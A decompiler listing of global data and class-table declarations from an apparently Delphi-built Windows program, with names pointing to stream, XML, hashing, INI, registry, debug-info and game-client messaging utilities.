_UNKNOWN loc_41A5B4; // weak
_UNKNOWN loc_41A5BB; // weak
int dword_41A5C8 = 0; // weak
int dword_41A5CC = 46; // weak
char byte_41A5D4 = '\x11'; // weak
_UNKNOWN loc_41A725; // weak
_UNKNOWN loc_41A72C; // weak
int dword_41A740 = 2573; // weak
_UNKNOWN loc_41AE86; // weak
_UNKNOWN loc_41AE8D; // weak
_UNKNOWN loc_41AF6D; // weak
_UNKNOWN loc_41AF74; // weak
_UNKNOWN loc_41B497; // weak
_UNKNOWN loc_41B49E; // weak
_UNKNOWN loc_41B4B4; // weak
_UNKNOWN loc_41B4BB; // weak
const WCHAR SubBlock = 92u; // idb
int dword_41B968[8] = { 0, 0, 0, 0, 0, 0, 0, 0 }; // weak
_UNKNOWN loc_41B9F0; // weak
_UNKNOWN loc_41B9F7; // weak
char byte_41BABC = '\x0E'; // weak
_UNKNOWN loc_41BE27; // weak
_UNKNOWN loc_41BE2E; // weak
_UNKNOWN loc_41C6D9; // weak
_UNKNOWN loc_41C6E0; // weak
_UNKNOWN loc_41C6F6; // weak
_UNKNOWN loc_41C6FD; // weak
int dword_41C780 = 7; // weak
int dword_41C7D8 = 44; // weak
_UNKNOWN loc_41CAD5; // weak
_UNKNOWN loc_41CC38; // weak
_UNKNOWN loc_41CC3F; // weak
_UNKNOWN loc_41CCA8; // weak
_UNKNOWN loc_41CCAF; // weak
_UNKNOWN loc_41CD18; // weak
_UNKNOWN loc_41CD1F; // weak
_UNKNOWN loc_41CD88; // weak
_UNKNOWN loc_41CD8F; // weak
_UNKNOWN loc_41CE89; // weak
_UNKNOWN loc_41CE90; // weak
_UNKNOWN loc_41CEA8; // weak
_UNKNOWN loc_41CEAF; // weak
_UNKNOWN loc_41CF29; // weak
_UNKNOWN loc_41CF30; // weak
_UNKNOWN loc_41CF48; // weak
_UNKNOWN loc_41CF4F; // weak
_UNKNOWN loc_41CFBC; // weak
_UNKNOWN loc_41CFC3; // weak
int (*off_41D944[2])() = { &sub_41A948, &sub_41A914 }; // weak
int (*off_41DA04[2])() = { &sub_41A948, &sub_41A914 }; // weak
int (*off_41DE78[2])() = { &sub_41A948, &sub_41A914 }; // weak
int (*off_41E170[2])() = { &sub_41A948, &sub_41A914 }; // weak
_UNKNOWN loc_41E21E; // weak
_UNKNOWN loc_41E225; // weak
_UNKNOWN loc_41E2B7; // weak
_UNKNOWN loc_41E2BE; // weak
_UNKNOWN loc_41E316; // weak
_UNKNOWN loc_41E31D; // weak
_UNKNOWN loc_41E3AF; // weak
_UNKNOWN loc_41E3B6; // weak
_UNKNOWN loc_41E406; // weak
_UNKNOWN loc_41E40D; // weak
_UNKNOWN loc_41E6EE; // weak
_UNKNOWN loc_41E6F5; // weak
_UNKNOWN loc_41EE57; // weak
_UNKNOWN loc_41EE5E; // weak
_UNKNOWN loc_41F055; // weak
_UNKNOWN loc_41F0AE; // weak
_UNKNOWN loc_41F3F0; // weak
_UNKNOWN loc_41F44B; // weak
_UNKNOWN loc_41F66F; // weak
_UNKNOWN loc_41F6EC; // weak
_UNKNOWN loc_41F6F3; // weak
_UNKNOWN loc_41F8D5; // weak
_UNKNOWN loc_41F8DC; // weak
_UNKNOWN loc_41F8F7; // weak
_UNKNOWN loc_41F8FE; // weak
_UNKNOWN loc_41FA4F; // weak
_UNKNOWN loc_41FAA3; // weak
_UNKNOWN loc_41FD78; // weak
_UNKNOWN loc_41FDCE; // weak
_UNKNOWN loc_41FF99; // weak
_UNKNOWN loc_42002B; // weak
_UNKNOWN loc_420035; // weak
_UNKNOWN loc_420270; // weak
_UNKNOWN loc_4202C4; // weak
_UNKNOWN loc_4205AC; // weak
_UNKNOWN loc_420602; // weak
_UNKNOWN loc_4207D0; // weak
_UNKNOWN loc_420828; // weak
_UNKNOWN loc_42082F; // weak
_UNKNOWN loc_420BC7; // weak
_UNKNOWN loc_420BCE; // weak
char byte_420C6C = '\x11'; // weak
_UNKNOWN loc_420DAC; // weak
_UNKNOWN loc_420DB3; // weak
_UNKNOWN loc_42102A; // weak
_UNKNOWN loc_421031; // weak
_UNKNOWN loc_42108C; // weak
_UNKNOWN loc_421AA4; // weak
_UNKNOWN loc_421AAB; // weak
int dword_421ABC = 92; // weak
void *off_422364 = (void *)0x430042; // weak
void *off_42239C = (void *)0x430042; // weak
void *off_4223D8 = (void *)0x430042; // weak
void *off_4223FC = (void *)0x430042; // weak
void *off_422420 = (void *)0x430042; // weak
void *off_422440 = (void *)0x430042; // weak
void *off_422464 = (void *)0x430042; // weak
char byte_4224D0 = '\x11'; // weak
int (*cls_CrossPlatform_TCustomMemoryStream)() = &sub_4274C0; // weak
int (*cls_CrossPlatform_TMemoryStream)() = &sub_4274C0; // weak
int (*cls_CrossPlatform_TResourceStream)() = &sub_4274C0; // weak
int (*cls_CrossPlatform_TList[2])() = { &sub_428090, &nullsub_9 }; // weak
int (*cls_CrossPlatform_EStreamError[2])() = { &sub_41A948, &sub_41A914 }; // weak
int (*cls_CrossPlatform_EReadError[2])() = { &sub_41A948, &sub_41A914 }; // weak
int (*cls_CrossPlatform_EWriteError[2])() = { &sub_41A948, &sub_41A914 }; // weak
int (*cls_CrossPlatform_EThread[2])() = { &sub_41A948, &sub_41A914 }; // weak
int (*cls_CrossPlatform_TEvent[2])() = { &sub_4283A0, &nullsub_10 }; // weak
int (*cls_CrossPlatform_TCriticalSection[3])() = { &sub_4285D0, &sub_4285E0, &sub_4283C0 }; // weak
int (*cls_CrossPlatform_TUnicodeStringList[3])() = { &sub_4287F0, &sub_429290, &sub_429710 }; // weak
int (*cls_CrossPlatform_TUnicodeFileStream)() = &sub_4274C0; // weak
_DWORD (__fastcall *cls_CrossPlatform_TFIFOItem)(Ibservices::TLicenseMaskInfo *__hidden this) = &Ibservices::TLicenseMaskInfo::Clear; // weak
__int16 cls_CrossPlatform_TFIFOContainer = 0; // weak
char byte_423524 = '\x0E'; // weak
_UNKNOWN unk_423578; // weak
_UNKNOWN loc_42397F; // weak
_UNKNOWN loc_423986; // weak
_UNKNOWN loc_423BAE; // weak
int dword_423BC8[2] = { 34, 132272 }; // weak
_strings str___0[1] = { { -1, 1, " " } }; // weak
int dword_423BE8[2] = { 38, 4230502 }; // weak
_UNKNOWN loc_423CB8; // weak
_UNKNOWN loc_423D6F; // weak
_UNKNOWN loc_423D76; // weak
_UNKNOWN loc_423D8F; // weak
_UNKNOWN loc_423DB7; // weak
_UNKNOWN loc_423DBE; // weak
int dword_423DD4[4] = { 95, 132272, -1, 8 }; // weak
_UNKNOWN loc_423E76; // weak
_UNKNOWN loc_423E7D; // weak
_UNKNOWN loc_424023; // weak
_UNKNOWN loc_42402A; // weak
_UNKNOWN loc_4240F2; // weak
_UNKNOWN loc_4240F9; // weak
_UNKNOWN loc_4241C6; // weak
_UNKNOWN loc_4241CD; // weak
int dword_42442C = 0; // weak
int dword_42444C[2] = { 0, 0 }; // weak
int dword_42446C = 0; // weak
_UNKNOWN loc_424A77; // weak
_UNKNOWN loc_424AD2; // weak
_UNKNOWN loc_424B49; // weak
_UNKNOWN loc_424BA0; // weak
_UNKNOWN loc_424BA7; // weak
_UNKNOWN loc_424BCF; // weak
_UNKNOWN loc_424BD6; // weak
int dword_424C04[4] = { 48, 132272, -1, 2 }; // weak
_UNKNOWN loc_424EEF; // weak
int dword_424F0C[4] = { 48, 132272, -1, 1 }; // weak
int dword_424F1C[4] = { 49, 132272, -1, 1 }; // weak
_UNKNOWN loc_424FA3; // weak
int dword_424FD4[3] = { 41, -2138216860, 0 }; // weak
_UNKNOWN loc_425053; // weak
int dword_425084[3] = { 41, -2138216860, 0 }; // weak
_UNKNOWN loc_4250DB; // weak
_UNKNOWN loc_4250E2; // weak
_UNKNOWN loc_425186; // weak
_UNKNOWN loc_42518D; // weak
int dword_425298[2] = { 92, 4230502 }; // weak
_UNKNOWN loc_4256C5; // weak
_UNKNOWN loc_4256CC; // weak
_UNKNOWN loc_425C62; // weak
_UNKNOWN loc_425C69; // weak
_UNKNOWN loc_425C84; // weak
_UNKNOWN loc_425C8B; // weak
_UNKNOWN loc_426029; // weak
_UNKNOWN loc_426030; // weak
_UNKNOWN loc_42634A; // weak
_UNKNOWN loc_426351; // weak
_UNKNOWN loc_426723; // weak
_UNKNOWN loc_42672A; // weak
_UNKNOWN loc_4267B5; // weak
_UNKNOWN loc_4267BF; // weak
_UNKNOWN loc_4267ED; // weak
_UNKNOWN loc_4267F4; // weak
int dword_42680C[4] = { 26, 132272, -1, 1 }; // weak
int dword_42681C = 0; // weak
_strings str___1[1] = { { -1, 1, " " } }; // weak
_UNKNOWN loc_42692B; // weak
_UNKNOWN loc_426932; // weak
_UNKNOWN loc_426FA0; // weak
_UNKNOWN loc_426FA7; // weak
_UNKNOWN loc_426FBE; // weak
_UNKNOWN loc_426FC5; // weak
_UNKNOWN loc_426FE0; // weak
_UNKNOWN loc_426FE7; // weak
_UNKNOWN loc_427005; // weak
_UNKNOWN loc_42700C; // weak
_UNKNOWN loc_4270E7; // weak
_UNKNOWN loc_4270EE; // weak
_UNKNOWN loc_4271DB; // weak
_UNKNOWN loc_427203; // weak
_UNKNOWN loc_42720A; // weak
_UNKNOWN loc_427583; // weak
_UNKNOWN loc_42758A; // weak
_UNKNOWN loc_427840; // weak
_UNKNOWN loc_427847; // weak
_UNKNOWN loc_427CF8; // weak
_UNKNOWN loc_427CFF; // weak
_UNKNOWN loc_4286AB; // weak
_UNKNOWN loc_4287D8; // weak
_UNKNOWN loc_4287DF; // weak
_UNKNOWN loc_428983; // weak
_UNKNOWN loc_42898A; // weak
_UNKNOWN loc_428D15; // weak
_UNKNOWN loc_42910B; // weak
_UNKNOWN loc_429112; // weak
_UNKNOWN loc_429279; // weak
_UNKNOWN loc_429280; // weak
_UNKNOWN loc_429309; // weak
_UNKNOWN loc_429310; // weak
_UNKNOWN loc_429626; // weak
_UNKNOWN loc_42962D; // weak
char byte_42995C = '\x11'; // weak
__int16 cls_NOM_TNOMAttr = 14; // weak
int (*cls_NOM_TNOMNode[3])() = { &sub_429DC0, &sub_429C60, &sub_429DD0 }; // weak
_UNKNOWN loc_429FF1; // weak
_UNKNOWN loc_42A0A8; // weak
_UNKNOWN loc_42A0AF; // weak
_UNKNOWN loc_42A317; // weak
char byte_42A3D0 = '\x11'; // weak
_UNKNOWN loc_42ADCC; // weak
_UNKNOWN loc_42ADD3; // weak
_UNKNOWN loc_42AE80; // weak
_UNKNOWN loc_42AE87; // weak
_UNKNOWN loc_42B021; // weak
_UNKNOWN loc_42B028; // weak
char byte_42B038 = '\x11'; // weak
__int16 cls_DebugSysUtil_TObjectList = 0; // weak
int (*cls_DebugSysUtil_TFileMappingStream)() = &sub_4274C0; // weak
char byte_42B1D8 = '\x11'; // weak
_UNKNOWN loc_42B6EB; // weak
_UNKNOWN loc_42B6F2; // weak
__int16 cls_DebugModuleInfoUtil_TModuleInfo = 0; // weak
__int16 cls_DebugModuleInfoUtil_TModuleInfoList = 0; // weak
_UNKNOWN loc_42BDC5; // weak
_UNKNOWN loc_42BDCC; // weak
_UNKNOWN loc_42BE65; // weak
_UNKNOWN loc_42BE6C; // weak
char byte_42BF1C = '\x11'; // weak
_UNKNOWN loc_42C02D; // weak
_UNKNOWN loc_42C034; // weak
_UNKNOWN loc_42C1E0; // weak
_UNKNOWN loc_42C1E7; // weak
_UNKNOWN loc_42C203; // weak
_UNKNOWN loc_42C20A; // weak
_UNKNOWN loc_42C3CB; // weak
_UNKNOWN loc_42C3D2; // weak
_UNKNOWN loc_42C790; // weak
_UNKNOWN loc_42C797; // weak
_UNKNOWN loc_42C802; // weak
_UNKNOWN loc_42C809; // weak
_UNKNOWN loc_42C81F; // weak
_UNKNOWN loc_42C826; // weak
_UNKNOWN loc_42C8A8; // weak
_UNKNOWN loc_42C8AF; // weak
char byte_42C9F8 = '\x0E'; // weak
_UNKNOWN loc_42CDE0; // weak
_UNKNOWN loc_42CDE7; // weak
_UNKNOWN loc_42CE33; // weak
_UNKNOWN loc_42CE3A; // weak
_UNKNOWN loc_42D5EF; // weak
_UNKNOWN loc_42D5F6; // weak
_UNKNOWN loc_42D6D6; // weak
_UNKNOWN loc_42D6DD; // weak
_UNKNOWN loc_42DC3C; // weak
_UNKNOWN loc_42DC43; // weak
const CHAR dword_42DC4C[] = { 'T', 'L', 'S', '\0' }; // idb
_UNKNOWN loc_42E862; // weak
_UNKNOWN loc_42E869; // weak
_UNKNOWN loc_42E993; // weak
_UNKNOWN loc_42E99A; // weak
_UNKNOWN loc_42E9F4; // weak
_UNKNOWN loc_42E9FB; // weak
_UNKNOWN loc_42EADF; // weak
_UNKNOWN loc_42EAE6; // weak
_strings str___2[1] = { { -1, 1, ";" } }; // weak
_UNKNOWN loc_42ED4A; // weak
_UNKNOWN loc_42EDE1; // weak
_UNKNOWN loc_42EDE8; // weak
char byte_42EF78 = '\x0E'; // weak
__int16 cls_DebugLocationInfoUtil_TDebugInfoList = 0; // weak
int (*cls_DebugLocationInfoUtil_TDebugInfoMap[4])() = { &sub_42F850, &unknown_libname_136, &sub_42FB80, &sub_42FAA0 }; // weak
int (*cls_DebugLocationInfoUtil_TDebugInfoSymbols[4])() = { &sub_42F850, &unknown_libname_136, &sub_42FD90, &sub_42FC50 }; // weak
_UNKNOWN loc_42F34D; // weak
_UNKNOWN loc_42F354; // weak
_UNKNOWN loc_42F35E; // weak
_UNKNOWN loc_42F3EA; // weak
_UNKNOWN loc_42F3F1; // weak
_UNKNOWN loc_42F3FB; // weak
_UNKNOWN loc_42F4F4; // weak
_UNKNOWN loc_42F4FB; // weak
_UNKNOWN loc_42F5B2; // weak
_UNKNOWN loc_42F6C7; // weak
_UNKNOWN loc_42F6CE; // weak
_UNKNOWN loc_42F766; // weak
_UNKNOWN loc_42F76D; // weak
_UNKNOWN loc_42F798; // weak
_UNKNOWN loc_42F79F; // weak
int dword_42F7B0[2] = { 123, 132272 }; // weak
_strings str___4[1] = { { -1, 1, " " } }; // weak
int dword_42F7D0[4] = { 125, 132272, -1, 1 }; // weak
int dword_42F7E0[4] = { 91, 132272, -1, 1 }; // weak
int dword_42F7F0[4] = { 93, 132272, -1, 1 }; // weak
int dword_42F800[4] = { 40, 132272, -1, 2 }; // weak
_UNKNOWN loc_42F8EA; // weak
_UNKNOWN loc_42FB46; // weak
_UNKNOWN loc_42FB4D; // weak
_UNKNOWN loc_42FB63; // weak
_UNKNOWN loc_42FB6A; // weak
_UNKNOWN loc_42FBDD; // weak
_UNKNOWN loc_42FBE4; // weak
_UNKNOWN loc_42FC29; // weak
_UNKNOWN loc_42FC30; // weak
_UNKNOWN loc_42FCF6; // weak
_UNKNOWN loc_42FCFD; // weak
_UNKNOWN loc_42FD76; // weak
_UNKNOWN loc_42FD7D; // weak
_UNKNOWN loc_4300FC; // weak
_strings str__[1] = { { -1, 1, "." } }; // weak
int dword_43017C[4] = { 41, 132272, -1, 5 }; // weak
__int16 cls_DebugStackInfoUtil_TStackInfoItem = 0; // weak
__int16 cls_DebugStackInfoUtil_TStackInfoList = 0; // weak
__int16 cls_DebugStackInfoUtil_TExceptFrameList = 0; // weak
_UNKNOWN loc_4309DE; // weak
_UNKNOWN loc_4309E5; // weak
_UNKNOWN loc_430A43; // weak
_UNKNOWN loc_430A4A; // weak
_UNKNOWN loc_430F8D; // weak
_UNKNOWN loc_4311F2; // weak
_UNKNOWN loc_4311F9; // weak
_UNKNOWN loc_4314D2; // weak
_UNKNOWN loc_4314D9; // weak
_strings str___0[1] = { { -1, 1, "." } }; // weak
_UNKNOWN loc_431A2C; // weak
_UNKNOWN loc_431A33; // weak
_UNKNOWN loc_431A99; // weak
_UNKNOWN loc_431AA0; // weak
_UNKNOWN loc_431B4C; // weak
_UNKNOWN loc_431B53; // weak
_UNKNOWN loc_431C04; // weak
_UNKNOWN loc_431C0B; // weak
_UNKNOWN loc_431CA2; // weak
_UNKNOWN loc_431CA9; // weak
_UNKNOWN loc_431EFA; // weak
_UNKNOWN loc_431F01; // weak
_UNKNOWN loc_431F69; // weak
_UNKNOWN loc_431F70; // weak
_UNKNOWN loc_432179; // weak
_UNKNOWN loc_432237; // weak
_UNKNOWN loc_432AAE; // weak
int (*off_432B9C)[8] = &dword_410020; // weak
void *off_432C24 = &loc_420020; // weak
_UNKNOWN loc_432FEE; // weak
_UNKNOWN loc_432FF5; // weak
_UNKNOWN loc_4332E9; // weak
_UNKNOWN loc_4332F0; // weak
_UNKNOWN loc_43332A; // weak
_UNKNOWN loc_433331; // weak
_UNKNOWN loc_43334C; // weak
_UNKNOWN loc_433353; // weak
_UNKNOWN loc_433440; // weak
_UNKNOWN loc_433447; // weak
_strings str___5[1] = { { -1, 1, " " } }; // weak
_UNKNOWN loc_4334C0; // weak
_UNKNOWN loc_4334C7; // weak
_strings str___6[1] = { { -1, 1, " " } }; // weak
_UNKNOWN loc_43358F; // weak
_UNKNOWN loc_433596; // weak
_strings str___7[1] = { { -1, 1, " " } }; // weak
_UNKNOWN loc_43374A; // weak
_UNKNOWN loc_433779; // weak
_UNKNOWN loc_433780; // weak
_UNKNOWN loc_4338A4; // weak
_UNKNOWN loc_4338AB; // weak
_strings str___9[1] = { { -1, 1, " " } }; // weak
_UNKNOWN loc_43390E; // weak
_UNKNOWN loc_433A56; // weak
_UNKNOWN loc_433A5D; // weak
_UNKNOWN loc_433A73; // weak
_UNKNOWN loc_433A7A; // weak
_UNKNOWN loc_433A95; // weak
_UNKNOWN loc_433A9C; // weak
_strings str___10[1] = { { -1, 1, " " } }; // weak
_UNKNOWN loc_433BB3; // weak
_UNKNOWN loc_433BBA; // weak
_UNKNOWN loc_433C40; // weak
_UNKNOWN loc_433C47; // weak
_strings str___11[1] = { { -1, 1, " " } }; // weak
_UNKNOWN loc_433D5C; // weak
int dword_433D98[2] = { 93, 4230502 }; // weak
_UNKNOWN loc_433EC7; // weak
_UNKNOWN loc_433ECE; // weak
_UNKNOWN loc_433EF1; // weak
_UNKNOWN loc_433EF8; // weak
_strings str___12[1] = { { -1, 1, " " } }; // weak
_UNKNOWN loc_4341DC; // weak
_UNKNOWN loc_4341E3; // weak
_UNKNOWN loc_434291; // weak
_UNKNOWN loc_434298; // weak
_UNKNOWN loc_434492; // weak
_UNKNOWN loc_434499; // weak
char byte_4345EC = '\x0E'; // weak
__int16 cls_NOMXML_TXMLReader = 14; // weak
_UNKNOWN loc_434807; // weak
_UNKNOWN loc_43480E; // weak
_UNKNOWN loc_4348B4; // weak
_UNKNOWN loc_4348BB; // weak
_UNKNOWN loc_43496A; // weak
_UNKNOWN loc_4349BD; // weak
_UNKNOWN loc_4349C4; // weak
int dword_434A48[2] = { 10, 4230502 }; // weak
_UNKNOWN loc_434C32; // weak
_UNKNOWN loc_434C39; // weak
_UNKNOWN loc_434EF0; // weak
_UNKNOWN loc_434EF7; // weak
int dword_434F08[2] = { 60, 66787 }; // weak
_strings str___13[1] = { { -1, 1, " " } }; // weak
int dword_434F28[4] = { 8765, 66787, -1, 1 }; // weak
int dword_434F38[4] = { 34, 66787, -1, 2 }; // weak
int dword_434F48[4] = { 15919, 66787, -1, 1 }; // weak
int dword_434F58[4] = { 62, 66787, -1, 1 }; // weak
int dword_434F68[4] = { 9, 66787, -1, 2 }; // weak
int dword_434F78[2] = { 12092, 4230502 }; // weak
_UNKNOWN loc_43505E; // weak
_UNKNOWN loc_435065; // weak
_UNKNOWN loc_435083; // weak
_UNKNOWN loc_43508A; // weak
_UNKNOWN loc_4356DF; // weak
_UNKNOWN loc_4356E6; // weak
_UNKNOWN loc_4358AD; // weak
_UNKNOWN loc_4358B4; // weak
_UNKNOWN loc_435F26; // weak
_UNKNOWN loc_435F2D; // weak
_UNKNOWN loc_436716; // weak
_UNKNOWN loc_43671D; // weak
_UNKNOWN loc_436E59; // weak
_UNKNOWN loc_436E60; // weak
_UNKNOWN loc_437174; // weak
_UNKNOWN loc_43717B; // weak
_UNKNOWN loc_437191; // weak
_UNKNOWN loc_437198; // weak
_UNKNOWN loc_437281; // weak
_UNKNOWN loc_437288; // weak
_UNKNOWN loc_437372; // weak
_UNKNOWN loc_437379; // weak
_UNKNOWN loc_43745C; // weak
_UNKNOWN loc_437463; // weak
_UNKNOWN loc_437575; // weak
char byte_43798C = '\x11'; // weak
char byte_437AB0 = '\x11'; // weak
char byte_437BD4 = '\x11'; // weak
char byte_437CFC = '\x11'; // weak
char byte_437E28 = '\x11'; // weak
int (*cls_HasherUtil_TCRC32SoftHasher[2])() = { &sub_43AAC0, &sub_43AAD0 }; // weak
int (*cls_HasherUtil_TMD5SoftHasher)() = &sub_43ABB0; // weak
int (*cls_HasherUtil_TMD5BCryptHasher[2])() = { &sub_43AE50, &sub_43AF30 }; // weak
int (*cls_HasherUtil_TMD5BCryptReusableHasher[2])() = { &sub_43B150, &sub_43B1D0 }; // weak
_UNKNOWN loc_438659; // weak
_UNKNOWN loc_438660; // weak
_UNKNOWN loc_43866E; // weak
void *off_438924 = (void *)0x44004D; // weak
void *off_438938 = (void *)0x44004D; // weak
_UNKNOWN loc_4390B1; // weak
_UNKNOWN loc_4390B8; // weak
_UNKNOWN loc_4390D6; // weak
_UNKNOWN loc_4390DD; // weak
_UNKNOWN loc_43922F; // weak
_UNKNOWN loc_439236; // weak
_UNKNOWN loc_439254; // weak
_UNKNOWN loc_43925B; // weak
_UNKNOWN loc_43939F; // weak
_UNKNOWN loc_4393A6; // weak
_UNKNOWN loc_4393C4; // weak
_UNKNOWN loc_4393CB; // weak
_UNKNOWN loc_43951F; // weak
_UNKNOWN loc_439526; // weak
_UNKNOWN loc_439544; // weak
_UNKNOWN loc_43954B; // weak
_UNKNOWN loc_4396DF; // weak
_UNKNOWN loc_4396E6; // weak
_UNKNOWN loc_439704; // weak
_UNKNOWN loc_43970B; // weak
_UNKNOWN loc_4397F5; // weak
_UNKNOWN loc_4397FC; // weak
_UNKNOWN loc_4398C6; // weak
_UNKNOWN loc_4398CD; // weak
_UNKNOWN loc_439946; // weak
_UNKNOWN loc_43994D; // weak
_UNKNOWN loc_439ACD; // weak
_UNKNOWN loc_439AD4; // weak
_UNKNOWN loc_439D98; // weak
_UNKNOWN loc_439D9F; // weak
_UNKNOWN loc_43A098; // weak
_UNKNOWN loc_43A09F; // weak
_UNKNOWN loc_43A458; // weak
_UNKNOWN loc_43A45F; // weak
_UNKNOWN loc_43AA18; // weak
_UNKNOWN loc_43AA1F; // weak
_UNKNOWN loc_43B2BC; // weak
_UNKNOWN loc_43DBB7; // weak
_UNKNOWN loc_43DBBE; // weak
_UNKNOWN loc_43DBC8; // weak
_UNKNOWN loc_43E0D3; // weak
_UNKNOWN loc_43E0DA; // weak
_UNKNOWN loc_43E280; // weak
_UNKNOWN loc_43E287; // weak
char byte_43E2F8 = '\x0E'; // weak
__int16 cls_IniUtil_TUnicodeStringHash = 14; // weak
__int16 cls_IniUtil_THashedUnicodeStringList = 0; // weak
int (__stdcall *cls_IniUtil_TUnicodeIniFile)(int) = &sub_43F890; // weak
_UNKNOWN loc_43E92B; // weak
_UNKNOWN loc_43E932; // weak
_UNKNOWN loc_43EB3E; // weak
_UNKNOWN loc_43EB45; // weak
_UNKNOWN loc_43EBAE; // weak
_UNKNOWN loc_43EBB5; // weak
_UNKNOWN loc_43EC73; // weak
_UNKNOWN loc_43EC7A; // weak
_UNKNOWN loc_43ED08; // weak
_UNKNOWN loc_43ED0F; // weak
int dword_43ED20[4] = { 61, 4230502, -2138216860, 0 }; // weak
_UNKNOWN loc_43EDF6; // weak
_UNKNOWN loc_43EDFD; // weak
_UNKNOWN loc_43EE2A; // weak
_UNKNOWN loc_43EE31; // weak
_UNKNOWN loc_43EEBC; // weak
_UNKNOWN loc_43EEC3; // weak
_UNKNOWN loc_43F06C; // weak
_UNKNOWN loc_43F073; // weak
_UNKNOWN loc_43F089; // weak
_UNKNOWN loc_43F090; // weak
_UNKNOWN loc_43F15C; // weak
_UNKNOWN loc_43F163; // weak
_UNKNOWN loc_43F1E6; // weak
_UNKNOWN loc_43F1ED; // weak
_UNKNOWN loc_43F2A3; // weak
_UNKNOWN loc_43F2AA; // weak
_UNKNOWN loc_43F2F5; // weak
_UNKNOWN loc_43F2FC; // weak
_UNKNOWN loc_43F3B2; // weak
_UNKNOWN loc_43F3B9; // weak
_strings str__[1] = { { -1, 1, "$" } }; // weak
_UNKNOWN loc_43F4CC; // weak
_UNKNOWN loc_43F4D3; // weak
_UNKNOWN loc_43F4E9; // weak
_UNKNOWN loc_43F4F0; // weak
_UNKNOWN loc_43F52D; // weak
_UNKNOWN loc_43F534; // weak
_UNKNOWN loc_43F5FD; // weak
_UNKNOWN loc_43F604; // weak
_UNKNOWN loc_43F61A; // weak
_UNKNOWN loc_43F621; // weak
_UNKNOWN loc_43F644; // weak
_UNKNOWN loc_43F64B; // weak
_UNKNOWN loc_43F688; // weak
_UNKNOWN loc_43F68F; // weak
_UNKNOWN loc_43F6B2; // weak
_UNKNOWN loc_43F6B9; // weak
int dword_43F6CC[4] = { 91, 132272, -1, 1 }; // weak
int dword_43F6DC = 93; // weak
_UNKNOWN loc_43F7F9; // weak
_UNKNOWN loc_43F800; // weak
_UNKNOWN loc_43F816; // weak
_UNKNOWN loc_43F81D; // weak
_UNKNOWN loc_43F85B; // weak
_UNKNOWN loc_43F862; // weak
_UNKNOWN loc_43F87D; // weak
_UNKNOWN loc_43F884; // weak
_UNKNOWN loc_43F93A; // weak
_UNKNOWN loc_43F941; // weak
_UNKNOWN loc_43F95A; // weak
_UNKNOWN loc_43F961; // weak
int dword_43F9E0 = 0; // weak
_UNKNOWN loc_43FA4C; // weak
_UNKNOWN loc_43FA53; // weak
_UNKNOWN loc_43FBBC; // weak
_UNKNOWN loc_43FBC3; // weak
_UNKNOWN loc_43FBE1; // weak
_UNKNOWN loc_43FBE8; // weak
_UNKNOWN loc_43FC9C; // weak
_UNKNOWN loc_43FCA3; // weak
_UNKNOWN loc_43FDBF; // weak
_UNKNOWN loc_43FDC6; // weak
_UNKNOWN loc_43FDEF; // weak
_UNKNOWN loc_43FDF6; // weak
_UNKNOWN loc_440161; // weak
_UNKNOWN loc_440168; // weak
_UNKNOWN loc_440181; // weak
_UNKNOWN loc_440188; // weak
_UNKNOWN loc_440273; // weak
_UNKNOWN loc_44027A; // weak
_UNKNOWN loc_440290; // weak
_UNKNOWN loc_440297; // weak
_UNKNOWN loc_4402BA; // weak
_UNKNOWN loc_4402C1; // weak
_UNKNOWN loc_4402E6; // weak
_UNKNOWN loc_4402ED; // weak
_UNKNOWN loc_440308; // weak
_UNKNOWN loc_44030F; // weak
_UNKNOWN loc_44043C; // weak
_UNKNOWN loc_440443; // weak
_UNKNOWN loc_440459; // weak
_UNKNOWN loc_440460; // weak
_UNKNOWN loc_440481; // weak
_UNKNOWN loc_440488; // weak
_UNKNOWN loc_4404D1; // weak
_UNKNOWN loc_4404D8; // weak
_UNKNOWN loc_440551; // weak
_UNKNOWN loc_440558; // weak
_UNKNOWN loc_440571; // weak
_UNKNOWN loc_440578; // weak
_UNKNOWN loc_44069F; // weak
_UNKNOWN loc_4406A6; // weak
_UNKNOWN loc_4406BC; // weak
_UNKNOWN loc_4406C3; // weak
_UNKNOWN loc_4406E4; // weak
_UNKNOWN loc_4406EB; // weak
_UNKNOWN loc_44076A; // weak
_UNKNOWN loc_440771; // weak
_UNKNOWN loc_440801; // weak
_UNKNOWN loc_440808; // weak
_UNKNOWN loc_440821; // weak
_UNKNOWN loc_440828; // weak
_UNKNOWN loc_440B07; // weak
_UNKNOWN loc_440C86; // weak
_UNKNOWN loc_440C8D; // weak
_UNKNOWN loc_440CA3; // weak
_UNKNOWN loc_440CAA; // weak
_UNKNOWN loc_440CC0; // weak
_UNKNOWN loc_440CC7; // weak
_UNKNOWN loc_440CE0; // weak
_UNKNOWN loc_440CE7; // weak
_UNKNOWN loc_440D0D; // weak
_UNKNOWN loc_440D14; // weak
_UNKNOWN loc_440DB0; // weak
_UNKNOWN loc_440DB7; // weak
_UNKNOWN loc_440DD0; // weak
_UNKNOWN loc_440DD7; // weak
_UNKNOWN loc_440E22; // weak
_UNKNOWN loc_440E29; // weak
_UNKNOWN loc_440EF5; // weak
_UNKNOWN loc_440EFC; // weak
_UNKNOWN loc_441052; // weak
_UNKNOWN loc_441059; // weak
_UNKNOWN loc_441081; // weak
_UNKNOWN loc_441088; // weak
int dword_44109C = 61; // weak
_UNKNOWN loc_441285; // weak
_UNKNOWN loc_44128C; // weak
_UNKNOWN loc_4412D2; // weak
_UNKNOWN loc_4412D9; // weak
_UNKNOWN loc_441301; // weak
_UNKNOWN loc_441308; // weak
int dword_44131C = 61; // weak
_UNKNOWN loc_44145B; // weak
_UNKNOWN loc_441462; // weak
_UNKNOWN loc_441478; // weak
_UNKNOWN loc_44147F; // weak
_UNKNOWN loc_4414A4; // weak
_UNKNOWN loc_4414AB; // weak
_UNKNOWN loc_441595; // weak
_UNKNOWN loc_44159C; // weak
_UNKNOWN loc_4415BF; // weak
_UNKNOWN loc_4415C6; // weak
int dword_4415DC = 61; // weak
int (*cls_GameClientCall_TMessageSendingThread[2])() = { &sub_441A20, &sub_43DD50 }; // weak
_UNKNOWN loc_44180A; // weak
_UNKNOWN loc_441A97; // weak
_UNKNOWN loc_441A9E; // weak
_UNKNOWN loc_441B69; // weak
_UNKNOWN loc_441CA9; // weak
_UNKNOWN loc_441CB0; // weak
__int16 cls_RegistryUtil_TUnicodeRegistry = 14; // weak
_UNKNOWN loc_441EB0; // weak
_UNKNOWN loc_441EB7; // weak
_UNKNOWN loc_4420C9; // weak
_UNKNOWN loc_4420D0; // weak
_UNKNOWN loc_442159; // weak
_UNKNOWN loc_442160; // weak
_UNKNOWN loc_4425E9; // weak
